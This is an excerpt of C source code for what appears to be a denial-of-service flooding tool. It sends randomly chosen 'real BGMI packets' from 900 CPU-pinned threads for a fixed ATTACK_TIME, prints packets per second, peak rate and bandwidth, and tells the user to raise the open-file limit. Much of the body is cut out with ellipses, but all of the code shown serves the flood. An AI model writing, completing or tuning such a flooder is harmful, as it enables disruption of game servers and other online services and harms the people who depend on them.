...
void create_payload(char *buf, int *size, unsigned int *seed) {
    int idx;
    int r = fast_rand(seed) % 100;
    
    if (r < 70) {
        do {
            idx = fast_rand(seed) % NUM_PAYLOADS;
        } while (ALL_SIZES[idx] < 300);
    } else {
        do {
            idx = fast_rand(seed) % NUM_PAYLOADS;
        } while (ALL_SIZES[idx] > 200);
    }
...
void *thread_worker(void *arg) {
    ...
    unsigned int seed = tid * 7654321 + tv.tv_usec + getpid() + (rand() % 1000);
    
    set_cpu_affinity(pthread_self(), tid);
...
void *direct_worker(void *arg) {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    unsigned int seed = 999999 + tv.tv_usec + (rand() % 5000);
    
    set_cpu_affinity(pthread_self(), 999);
...
void *stats_printer(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        unsigned long long curr_errors = atomic_load(&error_count);
        ...
        printf("🔥 PPS: %lluK | Peak: %lluK | Speed: %lluMbps | Err: %llu\n", 
               pps/1000, atomic_load(&peak_pps)/1000, mbps, curr_errors);
...
int main(int argc, char *argv[]) {
    ...
    printf("🧵 Threads: %d (FIXED 900)\n", THREAD_COUNT);
    printf("💾 Payloads: %d real BGMI packets (auto size)\n", NUM_PAYLOADS);
    printf("===============================================\n\n");
    
    printf("⚠️  Make sure to run: ulimit -n 65535\n\n");
    ...
    for (int i = 0; i < ATTACK_TIME && !atomic_load(&stop_signal); i++) {
        sleep(1);
    }
    ...
    unsigned long long errors = atomic_load(&error_count);
